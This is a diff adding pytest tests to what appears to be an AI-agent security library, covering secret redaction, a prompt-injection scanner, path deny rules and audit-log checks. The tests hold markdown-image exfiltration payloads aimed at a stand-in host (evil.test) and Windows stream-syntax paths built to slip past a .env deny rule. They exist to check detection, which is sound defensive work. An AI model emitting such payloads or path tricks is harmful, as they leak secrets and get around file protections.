@@ -1299,3 +1299,95 @@ def test_tool_calls_with_missing_or_non_string_names_are_refused_not_a_crash():
     ]
     out = run_openai_tool_calls(guard, Session(), calls, registry)
     assert all("refused" in m["content"] for m in out)
+
+
+# ------------------------------------------------- second review: redaction, limits, listings
+
+
+def test_a_secret_in_a_dict_value_is_redacted_by_its_key():
+    sink = MemorySink()
+    AuditLogger(sink).log(
+        "tool_request",
+        arguments={
+            "password": "supersecret123",
+            "pw": "  a b",
+            "auth": {"api_key": "abcd1234efgh5678"},
+            "q": "x",
+        },
+    )
+    logged = json.dumps(sink.records[-1]["data"])
+    assert "supersecret123" not in logged and "abcd1234efgh5678" not in logged
+    assert sink.records[-1]["data"]["arguments"]["pw"].startswith("[REDACTED:")
+    assert sink.records[-1]["data"]["arguments"]["q"] == "x"
+
+
+def test_the_output_guard_reads_past_the_scan_ceiling():
+    out = OutputGuard.default().process("." * 200_001 + " password=supersecret123")
+    assert "supersecret123" not in out.text
+
+
+@pytest.mark.parametrize("quote", ['"', "'"])
+def test_long_or_unterminated_quoted_secrets_are_redacted(quote):
+    assert "xxxx" not in redact_text(f"password={quote}{'x' * 500}{quote}")[0]
+    assert "hunter2hunter2" not in redact_text(f"password={quote}hunter2hunter2")[0]
+
+
+def test_repeated_image_openers_do_not_stall_the_scanner():
+    scanner = InjectionScanner()
+    start = time.perf_counter()
+    scanner.scan("![" * 50_000)  # was quadratic: over a second here, minutes for a full body
+    OutputGuard.default().process("eyJ-" * 25_000)  # the JWT rule had the same shape
+    assert time.perf_counter() - start < 1.0
+    long_label = "![" + "a " * 5000 + "](https://evil.test/?d=secret)"
+    assert "exfil_markdown" in scanner.scan(long_label).signals
+    assert "exfil_markdown" in scanner.scan("![x](https://evil.test/p?d=secret)").signals
+
+
+def test_nan_is_not_json_and_cannot_pass_numeric_bounds():
+    validator = JsonSchemaValidator({"type": "number", "maximum": 10})
+    assert validator.check("NaN") and validator.check("Infinity") and not validator.check("5")
+
+
+@pytest.mark.skipif(os.name != "nt", reason="alternate data streams are a Windows feature")
+def test_windows_stream_syntax_cannot_slip_past_deny_patterns(tmp_path):
+    (tmp_path / ".env").write_text("SECRET=1")
+    rule = ArgRule(type="path", roots=[str(tmp_path)], deny_patterns=[r"(^|[\/])\.env$"])
+    assert check_arg(str(tmp_path / ".env") + "::$DATA", rule)
+    assert check_arg(str(tmp_path / "notes.txt") + ":hidden", rule)
+    assert not check_arg(str(tmp_path / "notes.txt"), rule)
+
+
+def test_a_tool_dropped_from_a_full_listing_can_no_longer_be_called():
+    import asyncio
+
+    from tests.test_mcp import Listing, ToolV1, _client
+
+    client, fake = _client(Listing([ToolV1("search", "Find")]), Listing([]))
+
+    async def flow():
+        await client.list_tools()
+        await client.list_tools()
+        await client.call_tool("search", {"q": "x"})
+
+    with pytest.raises(ToolDenied):
+        asyncio.run(flow())
+    assert fake.calls == []
+
+
+def test_the_fuzz_gate_fails_when_every_case_errored(capsys):
+    from agentsec.cli import main
+
+    args = ["fuzz", "--target", "tests.fixtures_target:broken", "--max-cases", "2", "--quiet"]
+    assert main([*args, "--max-asr", "0"]) == 2
+    assert "nothing was evaluated" in capsys.readouterr().err
+
+
+def test_verify_file_reports_a_malformed_line_without_loading_the_file(tmp_path):
+    path = tmp_path / "audit.jsonl"
+    log = AuditLogger(FileSink(path))
+    log.log("a")
+    log.log("b")
+    with path.open("a", encoding="utf-8") as fh:
+        fh.write("{not json\n")
+    result = verify_file(path)
+    assert not result.ok and result.records_checked == 2 and "line 3" in result.reason
